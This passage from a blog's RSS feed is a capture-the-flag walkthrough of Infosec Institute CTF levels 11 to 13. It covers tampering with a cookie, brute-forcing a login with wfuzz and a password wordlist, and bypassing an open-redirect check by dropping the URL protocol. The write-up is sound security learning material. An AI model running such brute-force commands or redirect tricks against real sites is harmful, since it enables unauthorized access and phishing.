&lt;p&gt;Awwwww I was having such fun. But how? Not from my IP, as that&amp;rsquo;s going to change. First thing
to check: cookie jar. Yay!&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QgGrvwE.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;There it is, a big &lt;code&gt;no&lt;/code&gt;. I&amp;rsquo;ll change that to a &lt;code&gt;yes&lt;/code&gt;, reload and take the flag, thanks very much.&lt;/p&gt;

&lt;h1 id=&#34;level-12:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 12&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php&#34;&gt;Level 12&lt;/a&gt; is a bruteforce challange. No
login attempt limits, no rate limits, so it&amp;rsquo;s ripe for the picking.&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/LMUBNoq.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;After searching for the suggested password list, the first hit is the Openwall password list for
john the ripper. So why not download it and give it a try?&lt;/p&gt;

&lt;p&gt;I fire up &lt;code&gt;wfuzz&lt;/code&gt; with the following commandline&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$&amp;gt; wfuzz -c -z file,/usr/share/wordlists/password-2011.lst --hw Incorrect -d &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;username=admin&amp;amp;password=FUZZ&amp;amp;logIn=Login&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Within a few seconds I get a hit with &lt;code&gt;princess&lt;/code&gt;. Enter that with the username &lt;code&gt;admin&lt;/code&gt; and onto the next level&lt;/p&gt;

&lt;h1 id=&#34;level-13:ad4b2a18d89fa2f20e1d964dd8f70255&#34;&gt;Level 13&lt;/h1&gt;

&lt;p&gt;&lt;a href=&#34;http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=ex13-task.php&#34;&gt;Level 13&lt;/a&gt; is actually
redirect to &lt;code&gt;ex13-task.php&lt;/code&gt;. I need to make the redirect point to an external page so that to another user
it looks like they are visiting &lt;code&gt;ctf.infosecinstitute.com&lt;/code&gt; but are infact taken to another site&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/jNgQ4Ww.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Well the obvious thing is just to try and type in another URL &lt;code&gt;http://ctf.infosecinstitute.com/ctf2/exercises/ex13.php?redirect=http://unlogic.co.uk&lt;/code&gt;
but that gives me an error. Hrmm&amp;hellip; trying a few other redirect options tells me that the redirect is URL
relative, which means if I strip off the protocol off the URL, I should be able to make this work:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/QM7V8Dk.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/QM7V8Dk.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sure enough, that worked. That&amp;rsquo;s it, the final flag.&lt;/p&gt;

&lt;p&gt;Thanks to the Infosec Institute for another great CTF!&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>